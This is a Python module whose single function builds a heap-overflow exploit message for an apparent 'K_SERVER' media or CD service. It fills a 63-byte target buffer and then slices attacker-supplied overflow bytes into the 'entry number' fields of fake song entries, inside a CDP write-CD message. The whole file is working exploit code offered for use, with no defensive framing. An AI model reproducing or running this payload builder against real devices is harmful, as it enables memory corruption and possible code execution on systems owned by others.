from logging import getLogger
import math
import struct

__K_SERVER_USER_DEFINED_MESSAGE_ID: bytes = b"\xf8\xff"
__K_SERVER_CDP_WRITE_CD_MESSAGE_ID: bytes = b"\x01\x0b"
__DAM_ENTRY_NUMBER_LENGTH: int = 0x11
__K_SERVER_TARGET_BUFFER_LENGTH: int = 63

__logger = getLogger(__name__)


def make_payload(heap_overflow_payload: bytes):
    overflow_length = len(heap_overflow_payload)
    heap_payload = b"\x00" * __K_SERVER_TARGET_BUFFER_LENGTH + heap_overflow_payload

    # Padding
    cdp_write_cd_message_payload = b"\x00" * 16
    # Song count
    entry_count = math.ceil(len(heap_payload) / __DAM_ENTRY_NUMBER_LENGTH)
    cdp_write_cd_message_payload += struct.pack("B", entry_count)
    # Padding
    cdp_write_cd_message_payload += b"\x00" * 15

    for _ in range(entry_count):
        # Padding
        cdp_write_cd_message_payload += b"\x00" * 16
        # Entry number
        cdp_write_cd_message_payload += heap_payload[:__DAM_ENTRY_NUMBER_LENGTH]
        heap_payload = heap_payload[__DAM_ENTRY_NUMBER_LENGTH:]
        # Padding
        cdp_write_cd_message_payload += b"\x00" * 23

    cdp_write_cd_message: bytes = __K_SERVER_CDP_WRITE_CD_MESSAGE_ID
    cdp_write_cd_message += struct.pack(">H", len(cdp_write_cd_message_payload))
    cdp_write_cd_message += cdp_write_cd_message_payload

    payload: bytes = __K_SERVER_USER_DEFINED_MESSAGE_ID
    payload += struct.pack(">H", len(cdp_write_cd_message))
    payload += cdp_write_cd_message
    __logger.debug(f"{heap_overflow_payload.hex()=} {hex(overflow_length)=}")
    __logger.debug(f"{payload.hex()=}")
    return payload
